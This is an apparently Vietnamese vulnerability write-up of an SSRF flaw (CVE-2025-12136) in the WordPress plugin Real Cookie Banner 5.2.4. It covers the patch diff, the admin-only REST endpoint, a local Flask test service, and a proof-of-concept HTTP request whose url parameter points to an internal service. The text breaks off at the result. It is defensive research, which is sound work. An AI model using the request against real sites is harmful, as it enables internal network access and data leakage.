2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Real Cookie Banner&lt;/strong&gt;: &lt;strong&gt;5.2.4&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;5.2.5&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function routeScanWithoutLogin($request)&#xA;{&#xA;    $url = $request-&amp;gt;get_param(&amp;#39;url&amp;#39;);&#xA;    $jobId = $request-&amp;gt;get_param(&amp;#39;jobId&amp;#39;);&#xA;    if ($checker-&amp;gt;start($url, \false)) {&#xA;        $requestArguments = $checker-&amp;gt;getRequestArguments();&#xA;        $result = \wp_remote_get($url, [&amp;#39;redirection&amp;#39; =&amp;gt; 0, &amp;#39;cookies&amp;#39; =&amp;gt; $requestArguments[&amp;#39;cookies&amp;#39;], &amp;#39;headers&amp;#39; =&amp;gt; $requestArguments[&amp;#39;headers&amp;#39;], &amp;#39;timeout&amp;#39; =&amp;gt; $requestArguments[&amp;#39;timeout&amp;#39;], &amp;#39;sslverify&amp;#39; =&amp;gt; $requestArguments[&amp;#39;sslverify&amp;#39;]]);&#xA;        $status = \wp_remote_retrieve_response_code($result);&#xA;    &#xA;        $ok = $status &amp;gt;= 200 &amp;amp;&amp;amp; $status &amp;lt; 300;&#xA;        $location = \wp_remote_retrieve_header($result, &amp;#39;Location&amp;#39;);&#xA;        return new WP_REST_Response([&amp;#39;status&amp;#39; =&amp;gt; $status, &amp;#39;statusText&amp;#39; =&amp;gt; \wp_remote_retrieve_response_message($result), &amp;#39;ok&amp;#39; =&amp;gt; $ok, &amp;#39;headers&amp;#39; =&amp;gt; (object) \wp_remote_retrieve_headers($result), &amp;#39;redirected&amp;#39; =&amp;gt; !empty($location), &amp;#39;responseUrl&amp;#39; =&amp;gt; $location, &amp;#39;body&amp;#39; =&amp;gt; \wp_remote_retrieve_body($result)]);&#xA;    } else {&#xA;        return new WP_Error(&amp;#39;rest_scan_without_login_error&amp;#39;, &amp;#39;Loopback request could not be started.&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, h√†m &lt;code&gt;routeScanWithoutLogin()&lt;/code&gt; nh·∫≠n tham s·ªë &lt;code&gt;url&lt;/code&gt; tr·ª±c ti·∫øp t·ª´ &lt;code&gt;$request-&amp;gt;get_param(&#39;url&#39;)&lt;/code&gt; v√† s·ª≠ d·ª•ng n√≥ ngay trong l·ªánh &lt;code&gt;wp_remote_get()&lt;/code&gt; m√† kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø ki·ªÉm tra ho·∫∑c l·ªçc n√†o =&amp;gt; ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn l·ªó h·ªïng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Ph·∫ßn tr·∫£ v·ªÅ ƒë√≥ng g√≥i to√†n b·ªô k·∫øt qu·∫£ t·ª´ &lt;code&gt;wp_remote_get($url)&lt;/code&gt; th√†nh JSON:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;status&lt;/code&gt;, &lt;code&gt;statusText&lt;/code&gt;: m√£ v√† th√¥ng ƒëi·ªáp HTTP.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;ok&lt;/code&gt;: true n·∫øu m√£ 2xx.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;headers&lt;/code&gt;: to√†n b·ªô header c·ªßa response.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;redirected&lt;/code&gt;, &lt;code&gt;responseUrl&lt;/code&gt;: th√¥ng tin redirect n·∫øu c√≥.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;body&lt;/code&gt;: n·ªôi dung tr·∫£ v·ªÅ t·ª´ URL.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; Server th·ª±c ch·∫•t chuy·ªÉn ti·∫øp to√†n b·ªô ph·∫£n h·ªìi t·ª´ URL n·ªôi b·ªô ra ngo√†i, g√¢y r√≤ r·ªâ d·ªØ li·ªáu khi b·ªã SSRF.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function routeScanWithoutLogin($request)&#xA;{&#xA;    $url = $request-&amp;gt;get_param(&amp;#39;url&amp;#39;);&#xA;    $jobId = $request-&amp;gt;get_param(&amp;#39;jobId&amp;#39;);&#xA;    // Validate that the URL belongs to the jobs&amp;#39; domain to prevent SSRF attacks&#xA;    $jobDataUrl = $job-&amp;gt;data-&amp;gt;url;&#xA;    $parsed_url = \wp_parse_url($url);&#xA;    if (!$parsed_url || !isset($parsed_url[&amp;#39;host&amp;#39;])) {&#xA;        return new WP_Error(&amp;#39;rest_invalid_url&amp;#39;, &amp;#39;Invalid URL provided&amp;#39;);&#xA;    }&#xA;    $current_domain = \wp_parse_url($jobDataUrl, \PHP_URL_HOST);&#xA;    if ($parsed_url[&amp;#39;host&amp;#39;] !== $current_domain) {&#xA;        return new WP_Error(&amp;#39;rest_invalid_domain&amp;#39;, &amp;#39;URL must belong to the jobs\&amp;#39; domain&amp;#39;);&#xA;    }&#xA;    if ($checker-&amp;gt;start($url, \false)) {&#xA;        $requestArguments = $checker-&amp;gt;getRequestArguments();&#xA;        $result = \wp_remote_get($url, [&amp;#39;redirection&amp;#39; =&amp;gt; 0, &amp;#39;cookies&amp;#39; =&amp;gt; $requestArguments[&amp;#39;cookies&amp;#39;], &amp;#39;headers&amp;#39; =&amp;gt; $requestArguments[&amp;#39;headers&amp;#39;], &amp;#39;timeout&amp;#39; =&amp;gt; $requestArguments[&amp;#39;timeout&amp;#39;], &amp;#39;sslverify&amp;#39; =&amp;gt; $requestArguments[&amp;#39;sslverify&amp;#39;]]);&#xA;        $status = \wp_remote_retrieve_response_code($result);&#xA;    &#xA;        $ok = $status &amp;gt;= 200 &amp;amp;&amp;amp; $status &amp;lt; 300;&#xA;        $location = \wp_remote_retrieve_header($result, &amp;#39;Location&amp;#39;);&#xA;        return new WP_REST_Response([&amp;#39;status&amp;#39; =&amp;gt; $status, &amp;#39;statusText&amp;#39; =&amp;gt; \wp_remote_retrieve_response_message($result), &amp;#39;ok&amp;#39; =&amp;gt; $ok, &amp;#39;headers&amp;#39; =&amp;gt; (object) \wp_remote_retrieve_headers($result), &amp;#39;redirected&amp;#39; =&amp;gt; !empty($location), &amp;#39;responseUrl&amp;#39; =&amp;gt; $location, &amp;#39;body&amp;#39; =&amp;gt; \wp_remote_retrieve_body($result)]);&#xA;    } else {&#xA;        return new WP_Error(&amp;#39;rest_scan_without_login_error&amp;#39;, &amp;#39;Loopback request could not be started.&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒëa th√™m c√°c bi·ªán ph√°p x√°c th·ª±c ƒë·∫ßu v√†o ƒë·ªÉ ngƒÉn ch·∫∑n vi·ªác s·ª≠ d·ª•ng URL t√πy √Ω:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Tr√≠ch xu·∫•t URL h·ª£p l·ªá c·ªßa job hi·ªán t·∫°i&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$jobDataUrl = $job-&amp;gt;data-&amp;gt;url;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; L·∫•y domain h·ª£p l·ªá m√† job ƒë∆∞·ª£c ph√©p x·ª≠ l√Ω.&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Ph√¢n t√≠ch v√† x√°c th·ª±c c·∫•u tr√∫c URL do ng∆∞·ªùi d√πng g·ª≠i l√™n&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$parsed_url = \wp_parse_url($url);&#xA;if (!$parsed_url || !isset($parsed_url[&amp;#39;host&amp;#39;])) {&#xA;    return new WP_Error(&amp;#39;rest_invalid_url&amp;#39;, &amp;#39;Invalid URL provided&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; ƒê·∫£m b·∫£o URL h·ª£p l·ªá, c√≥ ph·∫ßn &lt;code&gt;host&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;So s√°nh domain h·ª£p l·ªá v·ªõi domain c·ªßa job&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$current_domain = \wp_parse_url($jobDataUrl, \PHP_URL_HOST);&#xA;if ($parsed_url[&amp;#39;host&amp;#39;] !== $current_domain) {&#xA;    return new WP_Error(&amp;#39;rest_invalid_domain&amp;#39;, &amp;#39;URL must belong to the jobs\&amp;#39; domain&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; N·∫øu domain kh√°c, tr·∫£ v·ªÅ l·ªói thay v√¨ ti·∫øp t·ª•c th·ª±c hi·ªán request. Gi·ªõi h·∫°n request ch·ªâ trong c√πng domain h·ª£p l·ªá, lo·∫°i b·ªè kh·∫£ nƒÉng SSRF ƒë·∫øn h·ªá th·ªëng kh√°c.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;routeScanWithoutLogin()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho REST API t·∫°i ƒë∆∞·ªùng d·∫´n &lt;code&gt;/wp-json/&amp;lt;namespace&amp;gt;/scanner/scan-without-login&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    $namespace,&#xA;    &amp;#39;/scanner/scan-without-login&amp;#39;,&#xA;    [&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;GET&amp;#39;,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; [$this, &amp;#39;routeScanWithoutLogin&amp;#39;],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; [$this, &amp;#39;permission_callback&amp;#39;],&#xA;        &amp;#39;args&amp;#39;                =&amp;gt; [&#xA;            &amp;#39;url&amp;#39; =&amp;gt; [&#xA;                &amp;#39;type&amp;#39;     =&amp;gt; &amp;#39;string&amp;#39;,&#xA;                &amp;#39;required&amp;#39; =&amp;gt; true,&#xA;            ],&#xA;            &amp;#39;jobId&amp;#39; =&amp;gt; [&#xA;                &amp;#39;type&amp;#39;     =&amp;gt; &amp;#39;number&amp;#39;,&#xA;                &amp;#39;required&amp;#39; =&amp;gt; true,&#xA;            ],&#xA;        ],&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;API s·ª≠ d·ª•ng &lt;strong&gt;GET&lt;/strong&gt;, y√™u c·∫ßu hai tham s·ªë b·∫Øt bu·ªôc &lt;code&gt;url&lt;/code&gt; (string) v√† &lt;code&gt;jobId&lt;/code&gt; (number). Quy·ªÅn truy c·∫≠p ƒë∆∞·ª£c ki·ªÉm tra qua &lt;code&gt;permission_callback()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const MANAGE_MIN_CAPABILITY = &amp;#39;manage_real_cookie_banner&amp;#39;;&#xA;&#xA;public function permission_callback()&#xA;{&#xA;    return \current_user_can(Core::MANAGE_MIN_CAPABILITY);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://docs.devowl.io/real-cookie-banner/php/classes/DevOwl-RealCookieBanner-Core.html#toc-constants&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;manage_real_cookie_banner&lt;/code&gt;&lt;/a&gt; m·∫∑c ƒë·ªãnh ch·ªâ d√†nh cho &lt;strong&gt;administrator&lt;/strong&gt;, n√™n endpoint ch·ªâ c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c b·ªüi ng∆∞·ªùi d√πng c√≥ quy·ªÅn n√†y. ƒê∆∞·ªùng d·∫´n ƒë·∫ßy ƒë·ªß c·ªßa endpoint c√≥ th·ªÉ ƒë∆∞·ª£c x√°c ƒë·ªãnh b·∫±ng c√°ch truy c·∫≠p &lt;code&gt;/wp-json&lt;/code&gt; v√† t√¨m t·ª´ kh√≥a &lt;code&gt;scan-without-login&lt;/code&gt; thay v√¨ &lt;code&gt;trace&lt;/code&gt; th√™m logic c·ªßa plugin.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/api.png&#34; title=&#34;API ch·ª©a scan-without-login trong /wp-json&#34; data-thumbnail=&#34;/posts/2025-10-29-cve-2025-12136/api.png&#34; data-sub-html=&#34;&lt;h2&gt;API&lt;/h2&gt;&lt;p&gt;API ch·ª©a scan-without-login trong /wp-json&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-29-cve-2025-12136/api.png&#39; alt=&#34;API&#34; height=&#34;921&#34; width=&#34;1504&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;API ch·ª©a scan-without-login trong /wp-json&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; Endpoint ch√≠nh th·ª©c c·ªßa API: &lt;code&gt;/wp-json/real-cookie-banner/v1/scanner/scan-without-login&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ghi ch√∫&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;T·ª´ &lt;code&gt;job&lt;/code&gt; trong &lt;code&gt;jobId&lt;/code&gt; t√¥i li√™n t∆∞·ªüng ƒë·∫øn m·ªôt c√¥ng vi·ªác ƒëang ch·∫°y v√† ƒë∆∞·ª£c &lt;strong&gt;tracking&lt;/strong&gt; qua &lt;code&gt;jobId&lt;/code&gt;. T√¥i ƒë·∫∑t ƒëi·ªÉm debug trong &lt;code&gt;routeScanWithoutLogin()&lt;/code&gt; v√† th·ª≠ ch·ª©c nƒÉng, cho t·∫•t c·∫£ request ƒëi qua proxy BurpSuite. &lt;strong&gt;Scanner&lt;/strong&gt; l√† ch·ª©c nƒÉng g·ªçi API n√†y.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/debug.gif&#34; title=&#34;Debugger&#34; data-thumbnail=&#34;/posts/2025-10-29-cve-2025-12136/debug.gif&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-29-cve-2025-12136/debug.gif&#39; alt=&#34;Debug&#34; height=&#34;1200&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Quan s√°t trong tab HTTP history c·ªßa BurpSuite th·∫•y request ƒë·∫øn API b·ªã b·∫Øt v√† hi·ªÉn th·ªã trong HTTP History:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/http_history.png&#34; title=&#34;Request ƒë·∫øn API ƒë∆∞·ª£c b·∫Øt trong HTTP History&#34; data-thumbnail=&#34;/posts/2025-10-29-cve-2025-12136/http_history.png&#34; data-sub-html=&#34;&lt;h2&gt;HTTP History&lt;/h2&gt;&lt;p&gt;Request ƒë·∫øn API ƒë∆∞·ª£c b·∫Øt trong HTTP History&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-29-cve-2025-12136/http_history.png&#39; alt=&#34;HTTP History&#34; height=&#34;704&#34; width=&#34;1268&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request ƒë·∫øn API ƒë∆∞·ª£c b·∫Øt trong HTTP History&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def test():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;metadata&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng ch·ª©c nƒÉng scanner v√† cho request ƒëi qua proxy BurpSuite v·ªõi ng∆∞·ªùi d√πng Administrator&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;B·∫Øt request ƒë·∫øn endpoint &lt;code&gt;/wp-json/real-cookie-banner/v1/scanner/scan-without-login&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Ch·ªânh s·ª≠a URL v√† g·ª≠i:&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-json/real-cookie-banner/v1/scanner/scan-without-login?_v=1761578838&amp;amp;_locale=user&amp;amp;url=http://localhost:8001/metadata&amp;amp;jobId=65 HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: application/json, */*;q=0.1&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-admin/admin.php?page=real-cookie-banner-component&#xA;X-WP-Nonce: 83df92a708&#xA;Connection: keep-alive&#xA;Cookie: wp-settings-time-2=1761542750; wordpress_test_cookie=WP%20Cookie%20check; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1761754193%7CRyskfS8SL8JqeXoDqo9gGiN5eiEbjBx5EZ73dRIjmyt%7C19f099619d5257dcc6f5828078065f2e92c2945b71c28fea0d11612e83c42ec6; wp-settings-time-1=1761581951&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/result.png&#34; title=&#34;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&#34; data-thumbnail=&#34;/posts/2025-10-29-cve-2025-12136/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;N·ªôi dung 